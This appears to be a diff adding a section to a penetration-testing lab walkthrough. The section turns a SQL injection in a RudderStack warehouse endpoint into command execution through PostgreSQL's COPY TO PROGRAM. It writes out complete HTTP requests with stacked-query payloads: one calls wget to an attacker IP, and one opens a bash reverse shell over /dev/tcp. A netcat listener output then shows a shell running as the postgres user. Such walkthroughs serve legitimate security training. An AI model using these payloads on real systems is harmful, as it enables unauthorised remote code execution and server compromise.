@@ -310,3 +310,60 @@ func setupDB(ctx context.Context, connInfo string) error {
 We could also consult the application's online documentation. In a black box assessment scenario, we could research the error message online to determine the database.
 
 Since our injection point is at the end of the SQL statement and we are dealing with a PostgreSQL database, we have the ability to inject stacked queries. 
+
+We've confirmed the SQL injection vulnerability. Now, let's consider using PostgreSQL's `COPY` command, which can read from or write to local files if the user has the `pg_read_server_files` or `pg_write_server_files` roles. **While this isn't useful here, it can be valuable if the web app and database share the same server**.
+
+The `COPY` command can also copy data to or from a program or command if the database user has the `pg_execute_server_program role`. If the exploited database user has this permission, we have many options available for remote code execution. Verbose error messages may also disclose when an injection payload fails due to a lack of permissions.
+
+Let's try using `COPY` to call `wget` and send a request back to our VM. First, we'll set up an HTTP server with Python to handle the request.
+```bash
+┌──(kali㉿kali)-[~]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+
+```
+Next, we'll update the `source_id` in *Repeater* to `'; copy (select 'a') to program 'wget -q http://192.168.45.203:80/it_worked' -- -`:
+```text
+POST /v1/warehouse/pending-events?triggerUpload=true HTTP/1.1
+Host: rudderstack:8080
+Content-Type: application/json
+Content-Length: 102
+
+{
+"source_id": "'; copy (select 'a') to program 'wget -q http://192.168.45.203:80/it_worked' -- -"
+}
+```
+The application responded with an error, indicating that wget failed. However, if we check our HTTP server, the server did send a request.
+```bash
+┌──(kali㉿kali)-[~]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.130.144 - - [31/Jul/2025 16:05:49] code 404, message File not found
+192.168.130.144 - - [31/Jul/2025 16:05:49] "GET /it_worked HTTP/1.1" 404 -
+
+```
+We were able to use the SQL injection vulnerability to run a command on the server. From here, we should be able to get a reverse shell on the server.
+```text
+POST /v1/warehouse/pending-events?triggerUpload=true HTTP/1.1
+Host: rudderstack:8080
+Content-Type: application/json
+Content-Length: 114
+
+{
+"source_id": "'; copy (select 'a') to program 'bash -c \"bash -i >& /dev/tcp/192.168.45.203/1337 0>&1\"' -- -"
+}
+```
+Let's check our Netcat listener:
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 1337
+listening on [any] 1337 ...
+connect to [192.168.45.203] from (UNKNOWN) [192.168.130.144] 33746
+bash: cannot set terminal process group (85): Not a tty
+bash: no job control in this shell
+5bb0f9d91064:~/data$ id
+id
+uid=70(postgres) gid=70(postgres) groups=70(postgres),70(postgres)
+5bb0f9d91064:~/data$ 
+```
+We now have a reverse shell.
